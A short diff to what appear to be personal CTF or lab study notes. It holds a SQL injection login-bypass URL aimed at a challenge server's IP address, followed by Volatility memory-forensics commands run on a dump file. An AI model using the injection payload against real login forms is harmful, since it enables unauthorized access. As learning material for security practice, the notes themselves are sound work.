@@ -32,3 +32,14 @@ HTTP verb:
 - http://104.248.39.227:10003/
 - login
 - http://104.248.39.227:10003/?username=admin'or 5=5 -- -
+
+
+<hr/>
+--------------------
+
+- wget http://downloads.volatilityfoundation.org/releases/2.5/volatility_2.5.linux.standalone.zip
+- ./volatility_2.5_linux_x86
+- ./volatility_2.5_linux_x86 -h
+- ./volatility_2.5_linux_x86 -f
+- ./volatility_2.5_linux_x86 -f /media/ahmed20078/ahmed78/Documents/Cyber-Projects/dump.raw imageinfo
+- ./volatility_2.5_linux_x86 -f /media/ahmed20078/ahmed78/Documents/Cyber-Projects/dump.raw --profile=Win7SP1x64
